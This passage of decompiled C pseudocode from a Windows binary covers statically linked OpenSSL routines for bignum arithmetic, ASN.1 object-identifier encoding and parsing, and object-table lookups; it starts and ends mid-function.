  return result;
}

//----- (00421F50) --------------------------------------------------------
int __cdecl sub_421F50(_DWORD *a1, int a2, int a3)
{
  int v3; // ebp
  int v5; // eax
  int v6; // ebx
  int result; // eax
  _DWORD *v8; // esi
  _DWORD *v9; // edi
  unsigned int v10; // ebp
  int *v11; // esi
  unsigned int *i; // edi
  int v13; // ecx
  unsigned int v14; // edx
  int v15; // [esp+Ch] [ebp-4h]
  int v16; // [esp+18h] [ebp+8h]

  v3 = *(_DWORD *)(a3 + 4);
  v5 = *(_DWORD *)(a2 + 4);
  v6 = v5 - v3;
  v15 = v5;
  v16 = v3;
  if ( v5 - v3 >= 0 )
  {
    result = (int)sub_4173C0((int)a1, v5);
    if ( result )
    {
      v8 = *(_DWORD **)a2;
      v9 = (_DWORD *)*a1;
      v10 = sub_438990((_DWORD *)*a1, v8, *(unsigned int **)a3, v3);
      v11 = &v8[v16];
      for ( i = &v9[v16]; v6; v10 = (v13 == 0) & (unsigned __int8)v10 )
      {
        v13 = *v11;
        v14 = *v11 - v10;
        --v6;
        ++v11;
        *i++ = v14;
      }
      a1[1] = v15;
      a1[3] = 0;
      sub_416F60(a1);
      return 1;
    }
  }
  else
  {
    sub_408310(3, 115, 100, (int)"crypto\\bn\\bn_add.c", 121);
    return 0;
  }
  return result;
}

//----- (00422020) --------------------------------------------------------
int __cdecl sub_422020(_DWORD *a1, int a2, int a3)
{
  int *v3; // esi
  _DWORD *v4; // edi
  int v5; // eax
  int v7; // ebx

  v3 = (int *)a3;
  v4 = (_DWORD *)a2;
  if ( !*(_DWORD *)(a2 + 12) )
  {
    if ( !*(_DWORD *)(a3 + 12) )
      goto LABEL_4;
    v7 = 0;
LABEL_13:
    if ( sub_421EA0((int)a1, a2, a3) )
    {
      a1[3] = v7;
      return 1;
    }
    return 0;
  }
  if ( !*(_DWORD *)(a3 + 12) )
  {
    v7 = 1;
    goto LABEL_13;
  }
  v4 = (_DWORD *)a3;
  v3 = (int *)a2;
LABEL_4:
  v5 = v4[1];
  if ( v5 <= v3[1] )
    v5 = v3[1];
  if ( !sub_4173C0((int)a1, v5) )
    return 0;
  if ( sub_416960(v4, v3) < 0 )
  {
    if ( sub_421F50(a1, (int)v3, (int)v4) )
    {
      a1[3] = 1;
      return 1;
    }
    return 0;
  }
  if ( !sub_421F50(a1, (int)v4, (int)v3) )
    return 0;
  a1[3] = 0;
  return 1;
}

//----- (004220E0) --------------------------------------------------------
int __cdecl sub_4220E0(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // esi
  int v4; // ebx
  int *v5; // edi
  int result; // eax

  v3 = (_DWORD *)a2;
  v4 = *(_DWORD *)(a2 + 12);
  v5 = (int *)a3;
  if ( v4 != *(_DWORD *)(a3 + 12) )
  {
    if ( v4 )
    {
      v3 = (_DWORD *)a3;
      v5 = (int *)a2;
    }
    if ( sub_416960(v3, v5) >= 0 )
    {
      if ( !sub_421F50(a1, (int)v3, (int)v5) )
        return 0;
      a1[3] = 0;
      return 1;
    }
    else
    {
      if ( !sub_421F50(a1, (int)v5, (int)v3) )
        return 0;
      a1[3] = 1;
      return 1;
    }
  }
  else
  {
    result = sub_421EA0((int)a1, a2, a3);
    a1[3] = v4;
  }
  return result;
}

//----- (00422170) --------------------------------------------------------
char *__cdecl sub_422170(_DWORD *a1, int a2, unsigned int *a3)
{
  char *result; // eax
  int v4; // ebp
  int v5; // ebx
  unsigned int v6; // esi
  int v7; // ecx
  char v8; // al
  char *v9; // ecx
  int v10; // [esp-4h] [ebp-28h]
  char *Block; // [esp+10h] [ebp-14h]
  unsigned int v12; // [esp+14h] [ebp-10h]
  char v13; // [esp+18h] [ebp-Ch]

  Block = 0;
  v13 = 1;
  if ( sub_416DB0((int)a1) )
  {
    result = (char *)sub_4133F0(1u);
    Block = result;
    if ( result )
    {
      *result = 0;
      *a3 = 1;
      return result;
    }
    sub_408310(3, 142, 65, (int)"crypto\\bn\\bn_intern.c", 33);
    goto LABEL_35;
  }
  if ( (unsigned int)(a2 - 1) > 6 )
  {
    v10 = 43;
    goto LABEL_34;
  }
  v4 = 1 << a2;
  if ( sub_416E40((int)a1) )
    v13 = -1;
  if ( !*a1 || !a1[1] )
  {
    v10 = 55;
LABEL_34:
    sub_408310(3, 142, 68, (int)"crypto\\bn\\bn_intern.c", v10);
    goto LABEL_35;
  }
  v12 = sub_416F90(a1);
  Block = (char *)sub_4133F0(v12 + 1);
  if ( !Block )
  {
    sub_408310(3, 142, 65, (int)"crypto\\bn\\bn_intern.c", 66);
LABEL_35:
    sub_413490(Block);
    return 0;
  }
  v5 = (2 * (1 << a2) - 1) & *(_DWORD *)*a1;
  v6 = 0;
  while ( v5 || v6 + a2 + 1 < v12 )
  {
    LOBYTE(v7) = 0;
    if ( (v5 & 1) != 0 )
    {
      v7 = v5;
      if ( (v5 & v4) != 0 )
      {
        v7 = v5 - 2 * v4;
        if ( v6 + a2 + 1 >= v12 )
          v7 = v5 & ((2 * v4 - 1) >> 1);
      }
      if ( v7 <= -v4 || v7 >= v4 || (v7 & 1) == 0 )
      {
        v10 = 101;
        goto LABEL_34;
      }
      v5 -= v7;
      if ( v5 && v5 != 2 * v4 && v5 != v4 )
      {
        v10 = 113;
        goto LABEL_34;
      }
    }
    v8 = v7 * v13;
    v9 = &Block[v6 - a2];
    ++v6;
    v9[a2] = v8;
    v5 = v4 * sub_416A50(a1, v6 + a2) + (v5 >> 1);
    if ( v5 > 2 * v4 )
    {
      v10 = 124;
      goto LABEL_34;
    }
  }
  if ( v6 > v12 + 1 )
  {
    v10 = 130;
    goto LABEL_34;
  }
  result = Block;
  *a3 = v6;
  return result;
}

//----- (00422350) --------------------------------------------------------
int __cdecl sub_422350(int a1)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (00422360) --------------------------------------------------------
int __cdecl sub_422360(_DWORD *a1)
{
  int result; // eax

  for ( result = a1[1]; result < a1[2]; ++result )
    *(_DWORD *)(*a1 + 4 * result) = 0;
  return result;
}

//----- (00422380) --------------------------------------------------------
int __cdecl sub_422380(void *a1, int a2, int a3)
{
  if ( *(_DWORD *)(a2 + 4) > a3 )
    return 0;
  memset(a1, 0, 4 * a3);
  memcpy(a1, *(const void **)a2, 4 * *(_DWORD *)(a2 + 4));
  return 1;
}

//----- (004223C0) --------------------------------------------------------
int __cdecl sub_4223C0(_DWORD *a1, int a2, int a3)
{
  a1[4] |= 2u;
  *a1 = a2;
  a1[1] = a3;
  a1[2] = a3;
  a1[3] = 0;
  return sub_416F60(a1);
}

//----- (004223F0) --------------------------------------------------------
int __cdecl sub_4223F0(int a1, void *Src, int a3)
{
  if ( sub_4173C0(a1, a3) )
  {
    memcpy(*(void **)a1, Src, 4 * a3);
    *(_DWORD *)(a1 + 4) = a3;
    sub_416F60((_DWORD *)a1);
    return 1;
  }
  else
  {
    sub_408310(3, 144, 65, (int)"crypto\\bn\\bn_intern.c", 191);
    return 0;
  }
}

//----- (00422460) --------------------------------------------------------
int __cdecl sub_422460(_DWORD *a1, void *Src, size_t Size)
{
  _DWORD *v3; // esi

  v3 = sub_42C430();
  if ( !v3 )
    return 0;
  if ( !sub_437A10((int)v3, Src, Size) )
  {
    sub_42C4F0(v3);
    return 0;
  }
  sub_423E40(a1, 4, (int)v3);
  return 1;
}

//----- (004224B0) --------------------------------------------------------
int __cdecl sub_4224B0(_DWORD *a1, void *a2, signed int Size)
{
  int v3; // eax
  const void *v4; // edi
  int v5; // esi
  size_t v6; // eax

  if ( *a1 == 4 && (v3 = a1[1]) != 0 )
  {
    v4 = (const void *)sub_432B60(v3);
    v5 = sub_435D30(a1[1]);
    v6 = Size;
    if ( v5 < Size )
      v6 = v5;
    memcpy(a2, v4, v6);
    return v5;
  }
  else
  {
    sub_408310(13, 135, 109, (int)"crypto\\asn1\\evp_asn1.c", 36);
    return -1;
  }
}

//----- (00422520) --------------------------------------------------------
BOOL __cdecl sub_422520(int a1, int a2, int a3, int a4)
{
  int v5[2]; // [esp+0h] [ebp-18h] BYREF
  int v6[4]; // [esp+8h] [ebp-10h] BYREF

  v5[1] = (int)v6;
  v6[2] = a3;
  v5[0] = a2;
  v6[1] = 4;
  v6[0] = a4;
  v6[3] = 0;
  return sub_423F50((int)&unk_4F39BC, (int)v5, &a1) != 0;
}

//----- (00422580) --------------------------------------------------------
int __cdecl sub_422580(int *a1, _DWORD *a2, void *a3, signed int Size)
{
  _DWORD *v4; // esi
  int v5; // edi
  signed int v6; // eax
  const void *v7; // eax
  size_t v9; // [esp-8h] [ebp-10h]

  v4 = 0;
  v5 = -1;
  if ( *a1 != 16 )
    goto LABEL_11;
  if ( !a1[1] )
    goto LABEL_11;
  v4 = (_DWORD *)sub_423FE0((int *)&unk_4F39BC, a1);
  if ( !v4 )
    goto LABEL_11;
  if ( a2 )
    *a2 = *v4;
  v5 = sub_435D30(v4[1]);
  v6 = Size;
  if ( Size > v5 )
    v6 = v5;
  if ( a3 )
  {
    v9 = v6;
    v7 = (const void *)sub_432B60(v4[1]);
    memcpy(a3, v7, v9);
  }
  if ( v5 == -1 )
LABEL_11:
    sub_408310(13, 134, 109, (int)"crypto\\asn1\\evp_asn1.c", 111);
  sub_42FEF0((int)v4, (int)&unk_4F39BC);
  return v5;
}

//----- (00422620) --------------------------------------------------------
int __cdecl sub_422620(int a1, int a2, char *a3, unsigned int a4)
{
  unsigned int v4; // edx
  int v6; // ecx
  int v7; // edx
  int v8; // eax
  int v9; // edx
  unsigned int v10; // ebx
  int v11; // edi
  int v12; // eax
  int v13; // esi
  int v14; // eax
  int v15; // ecx
  int v16; // esi
  int v17; // edi
  int v18; // eax
  int v19; // ecx
  int i; // esi
  int v21; // eax
  unsigned int **v22; // [esp+8h] [ebp-1Ch]
  int v23; // [esp+Ch] [ebp-18h]
  int v24; // [esp+10h] [ebp-14h]
  char *v25; // [esp+14h] [ebp-10h]
  int v26; // [esp+18h] [ebp-Ch]
  int v27; // [esp+1Ch] [ebp-8h]
  int v28; // [esp+20h] [ebp-4h]
  char Block[24]; // [esp+24h] [ebp+0h] BYREF
  int v30; // [esp+50h] [ebp+2Ch]

  v4 = a4;
  v28 = a1;
  v23 = 0;
  v26 = 24;
  v22 = 0;
  if ( !a4 )
    return 0;
  if ( a4 == -1 )
    v4 = strlen(a3);
  v6 = *a3 - 48;
  v7 = v4 - 1;
  v27 = v6;
  if ( (unsigned int)v6 > 2 )
  {
    sub_408310(13, 100, 122, (int)"crypto\\asn1\\a_object.c", 61);
    goto LABEL_53;
  }
  if ( v7 <= 0 )
  {
    sub_408310(13, 100, 138, (int)"crypto\\asn1\\a_object.c", 66);
    goto LABEL_53;
  }
  v8 = a3[1];
  v9 = v7 - 1;
  v25 = a3 + 2;
  if ( v9 <= 0 )
    goto LABEL_51;
  while ( 2 )
  {
    if ( v8 != 46 && v8 != 32 )
    {
      sub_408310(13, 100, 131, (int)"crypto\\asn1\\a_object.c", 75);
      goto LABEL_53;
    }
    v10 = 0;
    v11 = 0;
    do
    {
      v12 = *v25;
      v30 = --v9;
      v24 = v12;
      ++v25;
      if ( v12 == 32 || v12 == 46 )
        break;
      v13 = v12;
      if ( v12 < 48 || v12 > 57 )
      {
        sub_408310(13, 100, 130, (int)"crypto\\asn1\\a_object.c", 88);
        goto LABEL_53;
      }
      if ( v11 )
        goto LABEL_23;
      if ( v10 >= 0x19999991 )
      {
        v11 = 1;
        if ( !v22 )
        {
          v22 = (unsigned int **)sub_4168C0();
          if ( !v22 )
            goto LABEL_53;
        }
        if ( !sub_417490(v22, v10) )
          goto LABEL_53;
LABEL_23:
        if ( !sub_438150(v22, 0xAu) || !sub_437FD0((int *)v22, v13 - 48) )
          goto LABEL_53;
        v9 = v30;
        v6 = v27;
        continue;
      }
      v10 = v12 + 10 * v10 - 48;
    }
    while ( v9 > 0 );
    v14 = v23;
    if ( v23 )
      goto LABEL_35;
    if ( v6 < 2 && v10 >= 0x28 )
    {
      sub_408310(13, 100, 147, (int)"crypto\\asn1\\a_object.c", 108);
      goto LABEL_53;
    }
    v15 = 5 * v6;
    if ( v11 )
    {
      if ( !sub_437FD0((int *)v22, 8 * v15) )
        goto LABEL_53;
      v14 = 0;
      v9 = v30;
    }
    else
    {
      v10 += 8 * v15;
    }
LABEL_35:
    v16 = 0;
    if ( !v11 )
    {
      do
      {
        Block[v16] = v10 & 0x7F;
        v10 >>= 7;
        ++v16;
      }
      while ( v10 );
      goto LABEL_42;
    }
    v17 = (sub_416F90(v22) + 6) / 7;
    if ( v17 > v26 )
    {
      v26 = v17 + 32;
      if ( !sub_4133F0(v17 + 32) )
        goto LABEL_53;
    }
    if ( !v17 )
    {
LABEL_41:
      v9 = v30;
      v14 = v23;
LABEL_42:
      v19 = v28;
      if ( v28 )
      {
        if ( v16 + v14 > a2 )
        {
          sub_408310(13, 100, 107, (int)"crypto\\asn1\\a_object.c", 148);
          goto LABEL_53;
        }
        for ( i = v16 - 1; i > 0; ++v14 )
          *(_BYTE *)(v19 + v14) = Block[i--] | 0x80;
        *(_BYTE *)(v19 + v14) = Block[0];
        v21 = v14 + 1;
      }
      else
      {
        v21 = v16 + v14;
      }
      v23 = v21;
      if ( v9 > 0 )
      {
        v6 = v27;
        v8 = v24;
        continue;
      }
LABEL_51:
      sub_417060((void **)v22);
      return v23;
    }
    break;
  }
  while ( 1 )
  {
    --v17;
    v18 = sub_437F10(v22, 0x80u);
    if ( v18 == -1 )
      break;
    Block[v16++] = v18;
    if ( !v17 )
      goto LABEL_41;
  }
LABEL_53:
  sub_417060((void **)v22);
  return 0;
}
// 4226FF: conditional instruction was optimized away because edx.4>=1
// 422620: using guessed type char Block[24];

//----- (004229E0) --------------------------------------------------------
unsigned int __cdecl sub_4229E0(char *a1, signed int a2, int a3)
{
  return sub_423740(a1, a2, a3, 0);
}

//----- (00422A00) --------------------------------------------------------
int __cdecl sub_422A00(int a1, int a2)
{
  int v2; // ebp
  char *v3; // esi
  signed int v4; // eax
  int v5; // ebx
  char *v6; // eax
  int v8; // esi
  char Block[80]; // [esp+10h] [ebp-54h] BYREF

  v2 = a1;
  v3 = Block;
  if ( !a2 || !*(_DWORD *)(a2 + 16) )
    return sub_405110(a1, (int)"NULL", 4);
  v4 = sub_423740(Block, 80, a2, 0);
  v5 = v4;
  if ( v4 > 79 )
  {
    v6 = (char *)sub_4133F0(v4 + 1);
    v3 = v6;
    if ( !v6 )
      return -1;
    sub_423740(v6, v5 + 1, a2, 0);
    v2 = a1;
  }
  if ( v5 > 0 )
  {
    sub_405110(v2, (int)v3, v5);
    if ( v3 != Block )
      sub_413490(v3);
    return v5;
  }
  else
  {
    v8 = sub_405110(v2, (int)"<INVALID>", 9);
    return v8 + sub_439EC0(v2, *(_DWORD *)(a2 + 16), *(_DWORD *)(a2 + 12));
  }
}

//----- (00422B30) --------------------------------------------------------
_DWORD *sub_422B30()
{
  _DWORD *result; // eax

  result = sub_413430(0x18u);
  if ( result )
  {
    result[5] = 1;
  }
  else
  {
    sub_408310(13, 123, 65, (int)"crypto\\asn1\\a_object.c", 328);
    return 0;
  }
  return result;
}

//----- (00422B70) --------------------------------------------------------
void __cdecl sub_422B70(void **Block)
{
  if ( Block )
  {
    if ( ((_BYTE)Block[5] & 4) != 0 )
    {
      sub_413490(*Block);
      sub_413490(Block[1]);
      Block[1] = 0;
      *Block = 0;
    }
    if ( ((_BYTE)Block[5] & 8) != 0 )
    {
      sub_413490(Block[4]);
      Block[4] = 0;
      Block[3] = 0;
    }
    if ( ((_BYTE)Block[5] & 1) != 0 )
      sub_413490(Block);
  }
}

//----- (00422C00) --------------------------------------------------------
void **__cdecl sub_422C00(void ***a1, _BYTE **a2, int Size)
{
  _BYTE *v3; // esi
  int v4; // eax
  char **v5; // esi
  signed int v7; // eax
  void **v8; // esi
  _BYTE *v9; // ebx
  void *v10; // edi
  _BYTE *v11; // ebx
  char v12[8]; // [esp+10h] [ebp-18h] BYREF
  int v13; // [esp+18h] [ebp-10h]
  int v14; // [esp+1Ch] [ebp-Ch]
  _BYTE *v15; // [esp+20h] [ebp-8h]
  int v16; // [esp+24h] [ebp-4h]

  if ( (unsigned int)(Size - 1) > 0x7FFFFFFE || !a2 || (v3 = *a2) == 0 || (char)v3[Size - 1] < 0 )
  {
    sub_408310(13, 196, 216, (int)"crypto\\asn1\\a_object.c", 241);
    return 0;
  }
  v13 = 0;
  v15 = v3;
  v14 = Size;
  v16 = 0;
  v4 = sub_423680((int)v12);
  if ( v4 )
  {
    v5 = sub_423310(v4);
    if ( a1 )
    {
      sub_422B70(*a1);
      *a1 = (void **)v5;
    }
    *a2 += Size;
    return (void **)v5;
  }
  v7 = 0;
  if ( Size > 0 )
  {
    while ( *v3 != 0x80 || v7 && (char)*(v3 - 1) < 0 )
    {
      ++v7;
      ++v3;
      if ( v7 >= Size )
        goto LABEL_14;
    }
    sub_408310(13, 196, 216, (int)"crypto\\asn1\\a_object.c", 271);
    return 0;
  }
LABEL_14:
  if ( !a1 || (v8 = *a1) == 0 || ((_BYTE)v8[5] & 1) == 0 )
  {
    v8 = (void **)sub_422B30();
    if ( !v8 )
      return 0;
  }
  v9 = *a2;
  v10 = v8[4];
  v8[4] = 0;
  if ( !v10 || (int)v8[3] < Size )
  {
    v8[3] = 0;
    sub_413490(v10);
    v10 = sub_4133F0(Size);
    if ( !v10 )
    {
      sub_408310(13, 196, 65, (int)"crypto\\asn1\\a_object.c", 316);
      if ( !a1 || *a1 != v8 )
      {
        sub_422B70(v8);
        return 0;
      }
      return 0;
    }
    v8[5] = (void *)((unsigned int)v8[5] | 8);
  }
  memcpy(v10, v9, Size);
  v11 = &v9[Size];
  v8[4] = v10;
  v8[3] = (void *)Size;
  *v8 = 0;
  v8[1] = 0;
  if ( a1 )
    *a1 = v8;
  *a2 = v11;
  return v8;
}
// 422C00: using guessed type char var_18[8];

//----- (00422DD0) --------------------------------------------------------
void **__cdecl sub_422DD0(void ***a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  __int16 v4; // ax
  void **result; // eax
  int v6; // [esp+4h] [ebp-Ch] BYREF
  size_t Size; // [esp+8h] [ebp-8h] BYREF
  int v8; // [esp+Ch] [ebp-4h] BYREF

  v3 = a2;
  a2 = (_DWORD *)*a2;
  if ( (sub_432B70((_BYTE **)&a2, &Size, &v6, &v8, a3) & 0x80u) != 0 )
  {
    v4 = 102;
LABEL_5:
    sub_408310(13, 147, v4, (int)"crypto\\asn1\\a_object.c", 222);
    return 0;
  }
  if ( v6 != 6 )
  {
    v4 = 116;
    goto LABEL_5;
  }
  result = sub_422C00(a1, (_BYTE **)&a2, Size);
  if ( result )
    *v3 = a2;
  return result;
}

//----- (00422E70) --------------------------------------------------------
int __cdecl sub_422E70(_DWORD *a1)
{
  int v1; // eax
  int v2; // ecx
  int v3; // edi
  int v4; // esi
  int v5; // ebx
  int v6; // ebp
  int v7; // edx
  int result; // eax

  v1 = a1[1];
  switch ( *a1 )
  {
    case 0:
      v2 = *(_DWORD *)(v1 + 12);
      v3 = v2 << 20;
      v4 = 0;
      if ( v2 <= 0 )
        goto LABEL_9;
      v5 = 0;
      do
      {
        v6 = *(unsigned __int8 *)(v4 + *(_DWORD *)(v1 + 16));
        v7 = v5 % 24;
        ++v4;
        v5 += 3;
        v3 ^= v6 << v7;
      }
      while ( v4 < *(_DWORD *)(v1 + 12) );
      result = (*a1 << 30) | v3 & 0x3FFFFFFF;
      break;
    case 1:
      result = (*a1 << 30) | sub_424590(*(_BYTE **)v1) & 0x3FFFFFFF;
      break;
    case 2:
      result = (*a1 << 30) | sub_424590(*(_BYTE **)(v1 + 4)) & 0x3FFFFFFF;
      break;
    case 3:
      v3 = *(_DWORD *)(v1 + 8);
LABEL_9:
      result = (*a1 << 30) | v3 & 0x3FFFFFFF;
      break;
    default:
      result = 0;
      break;
  }
  return result;
}

//----- (00422F70) --------------------------------------------------------
int __cdecl sub_422F70(_DWORD *a1, _DWORD *a2)
{
  int result; // eax
  int v3; // esi
  int v4; // edx
  unsigned int v5; // ecx
  unsigned __int8 *v6; // edx
  unsigned __int8 *v7; // esi
  int v8; // eax
  _BYTE *v9; // eax
  _BYTE *v10; // ecx
  bool v11; // cf
  unsigned __int8 v12; // dl
  _BYTE *v13; // eax
  _BYTE *v14; // ecx
  unsigned __int8 v15; // dl

  result = *a1 - *a2;
  if ( *a1 == *a2 )
  {
    v3 = a1[1];
    v4 = a2[1];
    switch ( *a1 )
    {
      case 0:
        v5 = *(_DWORD *)(v3 + 12);
        result = v5 - *(_DWORD *)(v4 + 12);
        if ( result )
          return result;
        v6 = *(unsigned __int8 **)(v4 + 16);
        v7 = *(unsigned __int8 **)(v3 + 16);
        if ( v5 < 4 )
          goto LABEL_7;
        while ( *(_DWORD *)v7 == *(_DWORD *)v6 )
        {
          v5 -= 4;
          v6 += 4;
          v7 += 4;
          if ( v5 < 4 )
          {
LABEL_7:
            if ( !v5 )
              return 0;
            break;
          }
        }
        v8 = *v7 - *v6;
        if ( !v8 )
        {
          if ( v5 <= 1 )
            return 0;
          v8 = v7[1] - v6[1];
          if ( !v8 )
          {
            if ( v5 <= 2 )
              return 0;
            v8 = v7[2] - v6[2];
            if ( !v8 )
            {
              if ( v5 <= 3 )
                return 0;
              v8 = v7[3] - v6[3];
            }
          }
        }
        return (v8 >> 31) | 1;
      case 1:
        v9 = *(_BYTE **)v3;
        if ( !*(_DWORD *)v3 )
          return -1;
        v10 = *(_BYTE **)v4;
        if ( !*(_DWORD *)v4 )
          return 1;
        do
        {
          v11 = *v9 < *v10;
          if ( *v9 != *v10 )
            return -v11 - (v11 - 1);
          if ( !*v9 )
            break;
          v12 = v9[1];
          v11 = v12 < v10[1];
          if ( v12 != v10[1] )
            return -v11 - (v11 - 1);
          v9 += 2;
          v10 += 2;
        }
        while ( v12 );
        return 0;
      case 2:
        v13 = *(_BYTE **)(v3 + 4);
        if ( !v13 )
          return -1;
        v14 = *(_BYTE **)(v4 + 4);
        if ( !v14 )
          return 1;
        break;
      case 3:
        return *(_DWORD *)(v3 + 8) - *(_DWORD *)(v4 + 8);
      default:
        return 0;
    }
    while ( 1 )
    {
      v11 = *v13 < *v14;
      if ( *v13 != *v14 )
        break;
      if ( !*v13 )
        return 0;
      v15 = v13[1];
      v11 = v15 < v14[1];
      if ( v15 != v14[1] )
        break;
      v13 += 2;
      v14 += 2;
      if ( !v15 )
        return 0;
    }
    return -v11 - (v11 - 1);
  }
  return result;
}

//----- (004230B0) --------------------------------------------------------
int __cdecl sub_4230B0(int a1)
{
  int result; // eax

  *(_DWORD *)(*(_DWORD *)(a1 + 4) + 8) = 0;
  result = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(result + 20) |= 0xDu;
  return result;
}

//----- (004230D0) --------------------------------------------------------
int __cdecl sub_4230D0(int a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 4);
  ++*(_DWORD *)(result + 8);
  return result;
}

//----- (004230E0) --------------------------------------------------------
void __cdecl sub_4230E0(void ***Block)
{
  Block[1][2] = (char *)Block[1][2] - 1;
  if ( !Block[1][2] )
    sub_422B70(Block[1]);
  sub_413490(Block);
}

//----- (00423120) --------------------------------------------------------
void sub_423120()
{
  if ( stru_538F78.RecursionCount )
  {
    sub_404FE0(stru_538F78.RecursionCount, 0);
    sub_424330((_DWORD *)stru_538F78.RecursionCount, (void (__cdecl *)(_DWORD))sub_4230B0);
    sub_424330((_DWORD *)stru_538F78.RecursionCount, (void (__cdecl *)(_DWORD))sub_4230D0);
    sub_424330((_DWORD *)stru_538F78.RecursionCount, (void (__cdecl *)(_DWORD))sub_4230E0);
    sub_424260((void **)stru_538F78.RecursionCount);
    stru_538F78.RecursionCount = 0;
  }
}

//----- (00423180) --------------------------------------------------------
void *__cdecl sub_423180(int a1)
{
  void **v2; // edi
  int i; // esi
  int j; // esi
  int *v5; // eax
  _DWORD *v6; // eax
  int v7; // [esp-Ch] [ebp-20h]
  void *Block; // [esp+4h] [ebp-10h]
  void *v9; // [esp+8h] [ebp-Ch]
  void *v10; // [esp+Ch] [ebp-8h]
  void *v11; // [esp+10h] [ebp-4h]

  Block = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  if ( !stru_538F78.RecursionCount )
  {
    stru_538F78.RecursionCount = (LONG)sub_4245F0(
                                         (int (__cdecl *)(_BYTE *))sub_422E70,
                                         (int (__cdecl *)(const char *, const char *))sub_422F70);
    if ( !stru_538F78.RecursionCount )
      return 0;
  }
  v2 = sub_439EE0(a1);
  if ( !v2 )
    goto LABEL_14;
  v11 = sub_4133F0(8u);
  if ( !v11
    || v2[3] && *(_DWORD *)(a1 + 16) && (Block = sub_4133F0(8u)) == 0
    || *v2 && (v9 = sub_4133F0(8u)) == 0
    || v2[1] && (v10 = sub_4133F0(8u)) == 0 )
  {
    sub_408310(8, 105, 65, (int)"crypto\\objects\\obj_dat.c", 212);
LABEL_14:
    for ( i = 0; i <= 3; ++i )
      sub_413490(*(&Block + i));
    sub_413490(v2);
    return 0;
  }
  for ( j = 0; j <= 3; ++j )
  {
    v5 = (int *)*(&Block + j);
    if ( v5 )
    {
      v7 = (int)*(&Block + j);
      *v5 = j;
      v5[1] = (int)v2;
      v6 = sub_424680((_DWORD *)stru_538F78.RecursionCount, v7);
      sub_413490(v6);
    }
  }
  v2[5] = (void *)((unsigned int)v2[5] & 0xFFFFFFF2);
  return v2[2];
}

//----- (00423310) --------------------------------------------------------
char **__cdecl sub_423310(unsigned int a1)
{
  _DWORD *v2; // eax
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  char v4; // [esp+8h] [ebp-18h] BYREF
  unsigned int v5; // [esp+10h] [ebp-10h]

  if ( a1 > 0x424 )
  {
    if ( stru_538F78.RecursionCount )
    {
      v5 = a1;
      v3[0] = 3;
      v3[1] = (int)&v4;
      v2 = sub_424780(stru_538F78.RecursionCount, (int)v3);
      if ( v2 )
        return (char **)v2[1];
      sub_408310(8, 103, 101, (int)"crypto\\objects\\obj_dat.c", 241);
    }
  }
  else
  {
    if ( !a1 || dword_4FB9D8[6 * a1] )
      return &off_4FB9D0[6 * a1];
    sub_408310(8, 103, 101, (int)"crypto\\objects\\obj_dat.c", 227);
  }
  return 0;
}
// 4FB9D0: using guessed type char *off_4FB9D0[2];
// 4FB9D8: using guessed type int dword_4FB9D8[];

//----- (004233A0) --------------------------------------------------------
char *__cdecl sub_4233A0(unsigned int a1)
{
  _DWORD *v2; // eax
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  char v4; // [esp+8h] [ebp-18h] BYREF
  unsigned int v5; // [esp+10h] [ebp-10h]

  if ( a1 > 0x424 )
  {
    if ( stru_538F78.RecursionCount )
    {
      v5 = a1;
      v3[0] = 3;
      v3[1] = (int)&v4;
      v2 = sub_424780(stru_538F78.RecursionCount, (int)v3);
      if ( v2 )
        return *(char **)v2[1];
      sub_408310(8, 104, 101, "crypto\\objects\\obj_dat.c", 268);
    }
  }
  else
  {
    if ( !a1 || dword_4FB9D8[6 * a1] )
      return off_4FB9D0[6 * a1];
    sub_408310(8, 104, 101, "crypto\\objects\\obj_dat.c", 254);
  }
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4FB9D0: using guessed type char *off_4FB9D0[2];
// 4FB9D8: using guessed type int dword_4FB9D8[];

//----- (00423440) --------------------------------------------------------
char *__cdecl sub_423440(unsigned int a1)
{
  _DWORD *v2; // eax
  int v3[2]; // [esp+0h] [ebp-20h] BYREF
  char v4; // [esp+8h] [ebp-18h] BYREF
  unsigned int v5; // [esp+10h] [ebp-10h]

  if ( a1 > 0x424 )
  {
    if ( stru_538F78.RecursionCount )
    {
      v5 = a1;
      v3[0] = 3;
      v3[1] = (int)&v4;
      v2 = sub_424780(stru_538F78.RecursionCount, (int)v3);
      if ( v2 )
        return *(char **)(v2[1] + 4);
      sub_408310(8, 102, 101, "crypto\\objects\\obj_dat.c", 295);
    }
  }
  else
  {
    if ( !a1 || dword_4FB9D8[6 * a1] )
      return (&off_4FB9D4)[6 * a1];
    sub_408310(8, 102, 101, "crypto\\objects\\obj_dat.c", 281);
  }
  return 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4FB9D4: using guessed type char *off_4FB9D4;
// 4FB9D8: using guessed type int dword_4FB9D8[];

//----- (004234E0) --------------------------------------------------------
int __cdecl sub_4234E0(int a1)
{
  int *v1; // ecx
  int v2; // eax
  unsigned int v3; // ecx
  char **v4; // edx
  int result; // eax
  char *v6; // edx
  unsigned __int8 *v7; // esi
  int v8; // eax

  v2 = *v1;
  v3 = *(_DWORD *)(*(_DWORD *)a1 + 12);
  v4 = &off_4FB9D0[6 * v2];
  result = v3 - (_DWORD)v4[3];
  if ( !result && v3 )
  {
    v6 = v4[4];
    v7 = *(unsigned __int8 **)(*(_DWORD *)a1 + 16);
    if ( v3 < 4 )
    {
LABEL_6:
      if ( !v3 )
        return 0;
    }
    else
    {
      while ( *(_DWORD *)v7 == *(_DWORD *)v6 )
      {
        v3 -= 4;
        v6 += 4;
        v7 += 4;
        if ( v3 < 4 )
          goto LABEL_6;
      }
    }
    v8 = *v7 - (unsigned __int8)*v6;
    if ( v8 )
      return (v8 >> 31) | 1;
    if ( v3 > 1 )
    {
      v8 = v7[1] - (unsigned __int8)v6[1];
      if ( v8 )
        return (v8 >> 31) | 1;
      if ( v3 > 2 )
      {
        v8 = v7[2] - (unsigned __int8)v6[2];
        if ( !v8 )
        {
          if ( v3 > 3 )
          {
            v8 = v7[3] - (unsigned __int8)v6[3];
            return (v8 >> 31) | 1;
          }
          return 0;
        }
        return (v8 >> 31) | 1;
      }
    }
